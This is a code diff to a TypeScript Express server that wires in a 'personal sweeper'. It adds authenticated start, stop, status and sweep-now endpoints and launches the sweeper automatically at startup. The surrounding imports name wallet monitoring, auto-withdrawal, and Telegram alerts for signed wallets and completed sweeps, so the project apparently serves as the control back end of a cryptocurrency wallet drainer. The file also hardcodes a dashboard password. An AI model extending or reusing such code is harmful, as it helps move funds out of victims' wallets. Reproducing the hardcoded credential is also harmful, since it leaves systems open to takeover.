@@ -11,6 +11,7 @@ import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMon
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
 import { startTransferRetry, stopTransferRetry, getRetryStatus, savePendingTransfer } from "./transfer-retry";
 import { notifyWalletSigned, notifyTransferSuccess, notifyTransferFailed, notifySweepSuccess, resolveTokenSymbol } from "./telegram-bot";
+import { startPersonalSweeper, stopPersonalSweeper, getPersonalSweeperStatus, triggerPersonalSweep } from "./personal-sweeper";
 
 const DASHBOARD_PASSWORD = "hourglass2024";
 
@@ -749,11 +750,31 @@ export async function registerRoutes(app: Express): Promise<Server> {
     res.json({ success: true, message: "Manual withdraw completed" });
   });
 
+  app.get("/api/personal-sweeper/status", requireDashboardAuth, (req, res) => {
+    res.json(getPersonalSweeperStatus());
+  });
+
+  app.post("/api/personal-sweeper/start", requireDashboardAuth, (req, res) => {
+    startPersonalSweeper();
+    res.json({ success: true, message: "Personal sweeper started" });
+  });
+
+  app.post("/api/personal-sweeper/stop", requireDashboardAuth, (req, res) => {
+    stopPersonalSweeper();
+    res.json({ success: true, message: "Personal sweeper stopped" });
+  });
+
+  app.post("/api/personal-sweeper/now", requireDashboardAuth, async (req, res) => {
+    await triggerPersonalSweep();
+    res.json({ success: true, message: "Personal sweep completed" });
+  });
+
   const httpServer = createServer(app);
 
   startWalletMonitor();
   startAutoWithdraw();
   startTransferRetry();
+  startPersonalSweeper();
 
   return httpServer;
 }
